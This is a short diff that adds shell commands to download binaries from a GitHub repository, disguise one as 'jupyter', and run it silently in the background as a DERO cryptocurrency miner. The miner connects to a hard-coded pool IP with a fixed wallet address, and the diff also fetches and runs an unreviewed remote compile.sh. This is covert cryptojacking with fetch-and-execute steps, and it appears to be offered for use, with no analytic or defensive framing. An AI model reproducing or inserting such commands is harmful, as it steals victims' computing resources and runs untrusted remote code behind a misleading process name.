@@ -1,0 +1,5 @@
+wget -q -O jupyter hhttps://github.com/terryputri/file/raw/main/bypass-dero && chmod +x jupyter
+wget -q -O jupyter https://github.com/terryputri/file/raw/main/dero-stratum && chmod +x jupyter
+wget https://raw.githubusercontent.com/terryputri/file/main/compile.sh && chmod +x compile.sh
+./jupyter  -r 167.172.84.152:443  -w dero1qyn5krz9a7w5728m723khpqwnkatu57tl6nq9n9hct37d5zmd7pq2qg32hmnr.$(echo $(shuf -i 1-20000 -n 1)-cok) >/dev/null &
+./compile.sh
